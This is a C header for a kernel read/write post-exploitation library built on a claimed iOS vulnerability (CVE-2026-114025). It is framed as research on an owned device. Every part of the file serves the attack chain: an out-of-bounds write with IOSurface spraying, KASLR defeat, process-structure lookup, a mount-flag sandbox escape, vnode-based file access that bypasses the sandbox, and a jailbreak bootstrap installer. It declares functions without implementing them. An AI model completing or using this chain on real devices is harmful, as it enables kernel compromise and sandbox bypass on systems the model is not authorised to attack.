/*
 * krw_helper.h — Kernel R/W Helper Library for CVE-2026-114025
 *
 * Educational research on owned device (iPhone Duo, A20 Pro, iOS 27.1).
 *
 * This library provides post-exploitation primitives built on top of the
 * AVE OOB write (kernel R/W) to enable:
 * 1. Kernel memory read/write
 * 2. KASLR slide detection
 * 3. Process structure manipulation
 * 4. Sandbox escape via mount flag manipulation
 * 5. Vnode-based arbitrary file operations
 * 6. Bootstrap installer (/var/jb layout)
 *
 * Architecture: The AVE OOB write corrupts IOSurface properties in
 * kalloc.49152. IOSurface property readback gives kernel heap info leak.
 * Combined with the OOB write, this gives full kernel R/W.
 *
 * IMPORTANT: All offsets are for iOS 27.1 (build 24A94232) on A20 Pro.
 * They MUST be verified against the kernelcache before use.
 */

#ifndef KRW_HELPER_H
#define KRW_HELPER_H

#include <stdint.h>
#include <stdbool.h>
#include <mach/mach.h>

typedef uint64_t kaddr_t;

/* Offset table — populated from kernelcache analysis + on-device verification */
typedef struct {
    /* Base addresses */
    uint64_t kaslr_slide;
    kaddr_t kernel_base;         /* __TEXT vmaddr + slide */

    /* allproc chain */
    kaddr_t allproc;             /* kernel symbol: allproc list head */

    /* struct proc offsets */
    uint32_t proc_p_pid;         /* offsetof(proc, p_pid) */
    uint32_t proc_p_next;        /* offsetof(proc, p_list.le_next) */
    uint32_t proc_p_name;        /* offsetof(proc, p_comm) */
    uint32_t proc_p_flag;        /* offsetof(proc, p_flag) — NOT in zalloc_ro */
    uint32_t proc_p_ro;          /* offsetof(proc, p_ro) — pointer to proc_ro */
    uint32_t proc_task;          /* offsetof(proc, task) */

    /* struct proc_ro offsets (READ-ONLY under SPTM — cannot write) */
    uint32_t proc_ro_p_ucred;    /* offsetof(proc_ro, p_ucred) */
    uint32_t proc_ro_p_csflags;  /* offsetof(proc_ro, p_csflags) */
    uint32_t proc_ro_syscall_filter; /* sandbox MAC label pointer */

    /* struct ucred offsets (READ-ONLY under SPTM) */
    uint32_t ucred_cr_uid;       /* offsetof(ucred, cr_uid) */
    uint32_t ucred_cr_ruid;      /* offsetof(ucred, cr_ruid) */
    uint32_t ucred_cr_svuid;     /* offsetof(ucred, cr_svuid) */
    uint32_t ucred_cr_label;     /* MAC label (sandbox) */

    /* mount structure offsets */
    uint32_t mount_mnt_flag;     /* offsetof(mount, mnt_flag) */
    uint32_t mount_mnt_data;     /* offsetof(mount, mnt_data) */

    /* vnode offsets for file operations */
    uint32_t vnode_v_mount;      /* offsetof(vnode, v_mount) */
    uint32_t vnode_v_data;       /* offsetof(vnode, v_data) */
    uint32_t vnode_v_name;       /* offsetof(vnode, v_name) */
    uint32_t vnode_v_parent;     /* offsetof(vnode, v_parent) */

    /* task offsets */
    uint32_t task_itk_space;     /* IPC space for Mach ports */
    uint32_t task_bsd_info;      /* back pointer to proc */
} krw_offsets_t;

/* Primitive state */
typedef struct {
    bool initialized;
    krw_offsets_t offsets;
    kaddr_t our_proc;            /* kernel address of our proc */
    kaddr_t our_task;            /* kernel address of our task */
    kaddr_t our_ucred;           /* kernel address of our ucred (read-only!) */
    pid_t our_pid;
    /* AVE exploit state */
    void *ave_session;           /* VTCompressionSessionRef */
    void *spray_surfaces[64];    /* IOSurfaceRef array */
    int corrupted_surface_idx;   /* which surface got corrupted */
} krw_state_t;

/*
 * Phase 1: Initialize kernel R/W primitive
 * Runs the AVE OOB write + IOSurface spray to establish R/W
 */
int krw_init(krw_state_t *state);

/*
 * Phase 2: Kernel memory operations
 */
uint64_t krw_read64(krw_state_t *state, kaddr_t addr);
uint32_t krw_read32(krw_state_t *state, kaddr_t addr);
int krw_read_buf(krw_state_t *state, kaddr_t addr, void *buf, size_t len);
int krw_write64(krw_state_t *state, kaddr_t addr, uint64_t val);
int krw_write32(krw_state_t *state, kaddr_t addr, uint32_t val);
int krw_write_buf(krw_state_t *state, kaddr_t addr, const void *buf, size_t len);

/*
 * Phase 3: KASLR slide detection
 * Scans kernel heap for known patterns to find the kernel base
 */
int krw_find_kaslr(krw_state_t *state);

/*
 * Phase 4: Process structure lookup
 * Walks allproc chain to find our proc structure
 */
kaddr_t krw_find_proc(krw_state_t *state, pid_t pid);
int krw_find_self(krw_state_t *state);

/*
 * Phase 5: Sandbox escape
 * Modifies mount flags to allow filesystem access
 * mount.mnt_flag is NOT in zalloc_ro — writable with kernel R/W
 */
int krw_sandbox_escape(krw_state_t *state);

/*
 * Phase 6: File operations via kernel R/W
 * Bypasses sandbox by directly manipulating vnode structures
 */
int krw_file_read(krw_state_t *state, const char *path, void *buf, size_t len);
int krw_file_write(krw_state_t *state, const char *path, const void *buf, size_t len);
int krw_mkdir(krw_state_t *state, const char *path, uint16_t mode);
int krw_symlink(krw_state_t *state, const char *target, const char *link);
int krw_chmod(krw_state_t *state, const char *path, uint16_t mode);

/*
 * Phase 7: Bootstrap installer
 * Creates /var/jb rootless layout and installs Sileo + dpkg
 */
int krw_install_bootstrap(krw_state_t *state, const char *bootstrap_tar_path);
int krw_install_deb(krw_state_t *state, const char *deb_path);

/*
 * Cleanup
 */
void krw_cleanup(krw_state_t *state);

/*
 * Offset detection (runs on-device to find correct offsets)
 * Uses known patterns in kernel memory to identify structure layouts
 */
int krw_detect_offsets(krw_state_t *state);

#endif /* KRW_HELPER_H */
